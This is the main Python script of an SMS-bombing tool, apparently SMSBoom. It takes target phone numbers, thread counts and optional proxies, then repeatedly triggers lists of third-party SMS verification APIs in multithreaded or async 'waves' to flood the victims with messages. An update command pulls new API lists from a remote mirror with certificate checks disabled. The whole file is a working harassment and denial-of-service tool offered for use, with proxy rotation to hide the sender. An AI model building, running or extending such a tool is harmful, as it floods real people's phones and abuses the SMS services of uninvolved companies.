# encoding=utf8
# 短信测压主程序

from utils import default_header_user_agent
from utils.log import logger
from utils.models import API
from utils.req import reqFunc, reqFuncByProxy, runAsync
from concurrent.futures import ThreadPoolExecutor
from typing import List, Union
import asyncio
import json
import pathlib
import sys
import time
import click
import httpx
import os

# 確定應用程序係一個腳本文件或凍結EXE
if getattr(sys, 'frozen', False):
    path = os.path.dirname(sys.executable)
elif __file__:
    path = os.path.dirname(__file__)


def load_proxies() -> list:
    """load proxies for files
    :return: proxies list
    """
    proxy_all = []
    proxy_file = ["http_proxy.txt", "socks5_proxy.txt", "socks4_proxy.txt"]
    for fn in proxy_file:
        f_obj = pathlib.Path(path, fn)
        if f_obj.exists():
            proxy_lst = pathlib.Path(path, fn).read_text(
                encoding="utf8").split("\n")
            if not proxy_lst:
                continue
            if fn == "http_proxy.txt":
                for proxy in proxy_lst:
                    if proxy:
                        proxy_all.append({'all://': 'http://' + proxy})
            elif fn == "socks5_proxy.txt":
                for proxy in proxy_lst:
                    if proxy:
                        proxy_all.append({'all://': 'socks5://' + proxy})
            elif fn == "socks4_proxy.txt":
                for proxy in proxy_lst:
                    if proxy:
                        proxy_all.append({'all://': 'socks4://' + proxy})
        else:
            f_obj.touch()
    logger.success(f"代理列表加载完成,代理数:{len(proxy_all)}")
    return proxy_all


def load_json() -> List[API]:
    """load json for api.json
    :return: api list
    """
    json_path = pathlib.Path(path, 'api.json')
    if not json_path.exists():
        logger.error("Json file not exists!")
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            APIs = [
                API(**data)
                for data in datas
            ]
            logger.success(f"api.json 加载完成 接口数:{len(APIs)}")
            return APIs
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            raise ValueError


def load_getapi() -> list:
    """load GETAPI
    :return:
    """
    json_path = pathlib.Path(path, 'GETAPI.json')
    if not json_path.exists():
        logger.error("GETAPI.json file not exists!")
        raise ValueError

    with open(json_path.resolve(), mode="r", encoding="utf8") as j:
        try:
            datas = json.loads(j.read())
            logger.success(f"GETAPI加载完成,数目:{len(datas)}")
            return datas
        except Exception as why:
            logger.error(f"Json file syntax error:{why}")
            raise ValueError


@click.command()
@click.option("--thread", "-t", help="线程数(默认64)", default=64)
@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.option('--frequency', "-f", default=1, help="执行次数(默认1次)", type=int)
@click.option('--interval', "-i", default=60, help="间隔时间(默认60s)", type=int)
@click.option('--enable_proxy', "-e", is_flag=True, help="开启代理(默认关闭)", type=bool)
def run(thread: int, phone: Union[str, tuple], frequency: int, interval: int, enable_proxy: bool = False):
    """传入线程数和手机号启动轰炸,支持多手机号"""
    logger.info(
        f"手机号:{phone}, 线程数:{thread}, 执行次数:{frequency}, 间隔时间:{interval}")
    try:
        _api = load_json()
        _api_get = load_getapi()
        _proxies = load_proxies()
        # fix: by Ethan
        if not _proxies:
            if enable_proxy:
                logger.error("无法读取任何代理....请取消-e")
                sys.exit(1)
            _proxies = [None]
    except ValueError:
        logger.error("读取接口出错!正在重新下载接口数据!....")
        update()
        sys.exit(1)

    with ThreadPoolExecutor(max_workers=thread) as pool:
        for i in range(1, frequency + 1):
            logger.success(f"第{i}波轰炸开始！")
            # 此處代碼邏輯有問題,如果 _proxy 為空就不會啓動轟炸,必須有東西才行
            for proxy in _proxies:
                logger.success(f"第{i}波轰炸 - 当前正在使用代理：" +
                                proxy['all://'] + " 进行轰炸...") if enable_proxy else logger.success(f"第{i}波开始轰炸...")
                # 不可用的代理或API过多可能会影响轰炸效果
                for api in _api:
                    pool.submit(reqFuncByProxy, api, phone, proxy) if enable_proxy else pool.submit(
                        reqFunc, api, phone)
                for api_get in _api_get:
                    pool.submit(reqFuncByProxy, api_get, phone, proxy) if enable_proxy else pool.submit(
                        reqFunc, api_get, phone)
                logger.success(f"第{i}波轰炸提交结束！休息{interval}s.....")
                time.sleep(interval)


@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.command()
def asyncRun(phone):
    """以最快的方式请求接口(真异步百万并发)"""
    _api = load_json()
    _api_get = load_getapi()

    apis = _api + _api_get

    loop = asyncio.get_event_loop()
    loop.run_until_complete(runAsync(apis, phone))


@click.option("--phone", "-p", help="手机号,可传入多个再使用-p传递", prompt=True, required=True, multiple=True)
@click.command()
def oneRun(phone):
    """单线程(测试使用)"""
    _api = load_json()
    _api_get = load_getapi()

    apis = _api + _api_get

    for api in apis:
        try:
            reqFunc(api, phone)
        except:
            pass


@click.command()
def update():
    """从 github 获取最新接口"""
    GETAPI_json_url = f"https://hk1.monika.love/OpenEthan/SMSBoom/master/GETAPI.json"
    API_json_url = f"https://hk1.monika.love/OpenEthan/SMSBoom/master/api.json"
    logger.info(f"正在从GitHub拉取最新接口!")
    try:
        with httpx.Client(verify=False, timeout=10) as client:
            GETAPI_json = client.get(
                GETAPI_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")
            api_json = client.get(
                API_json_url, headers=default_header_user_agent()).content.decode(encoding="utf8")

    except Exception as why:
        logger.error(f"拉取更新失败:{why}请关闭所有代理软件多尝试几次!")
    else:
        with open(pathlib.Path(path, "GETAPI.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(GETAPI_json)
        with open(pathlib.Path(path, "api.json").absolute(), mode="w", encoding="utf8") as a:
            a.write(api_json)
        logger.success(f"接口更新成功!")


@click.group()
def cli():
    pass


cli.add_command(run)
cli.add_command(update)
cli.add_command(asyncRun)
cli.add_command(oneRun)

if __name__ == "__main__":
    cli()
